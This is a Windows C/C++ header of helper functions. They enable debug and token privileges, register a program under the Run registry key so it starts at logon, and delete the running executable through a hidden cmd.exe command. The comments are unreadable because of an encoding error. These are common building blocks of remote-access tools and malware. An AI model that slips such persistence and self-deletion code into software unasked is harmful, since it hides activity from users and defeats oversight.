#pragma once
#include <windows.h>

// ����Ȩ��
inline int DebugPrivilege()
{
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return -1;

	// ��̬����ռ䣬���� 3 �� LUID
	TOKEN_PRIVILEGES* tp = (TOKEN_PRIVILEGES*)malloc(sizeof(TOKEN_PRIVILEGES) + 2 * sizeof(LUID_AND_ATTRIBUTES));
	if (!tp) { CloseHandle(hToken); return 1; }

	tp->PrivilegeCount = 3;

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp->Privileges[0].Luid)) { free(tp); CloseHandle(hToken); return 2; }
	tp->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!LookupPrivilegeValue(NULL, SE_INCREASE_QUOTA_NAME, &tp->Privileges[1].Luid)) { free(tp); CloseHandle(hToken); return 3; }
	tp->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;

	if (!LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &tp->Privileges[2].Luid)) { free(tp); CloseHandle(hToken); return 4; }
	tp->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, FALSE, tp, sizeof(TOKEN_PRIVILEGES) + 2 * sizeof(LUID_AND_ATTRIBUTES), NULL, NULL);

	free(tp);
	CloseHandle(hToken);
	return 0;
}

/**
* @brief ���ñ�����������
* @param[in] *sPath ע����·��
* @param[in] *sNmae ע���������
* @return ����ע����
* @details Win7 64λ�����ϲ��Խ��������ע�����ڣ�\n
* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
* @note �״�������Ҫ�Թ���ԱȨ�����У�������ע���д�뿪��������
*/
inline BOOL SetSelfStart(const char* sPath, const char* sNmae)
{
	DebugPrivilege();

	// д���ע���·��
#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"

	// ��ע�����д��������Ϣ
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyExA(HKEY_CURRENT_USER, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);

	// �ж��Ƿ�ɹ�
	if (lRet != ERROR_SUCCESS)
		return FALSE;

	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);

	// �ر�ע���
	RegCloseKey(hKey);

	// �ж��Ƿ�ɹ�
	return lRet == ERROR_SUCCESS;
}

inline BOOL self_del(void)
{
	char file[MAX_PATH] = { 0 }, szCmd[MAX_PATH * 2] = { 0 };
	if (GetModuleFileName(NULL, file, MAX_PATH) == 0)
		return FALSE;

	sprintf(szCmd, "cmd.exe /C timeout /t 3 /nobreak > Nul & Del /f /q \"%s\"", file);

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);

	if (CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return TRUE;
	}

	return FALSE;
}
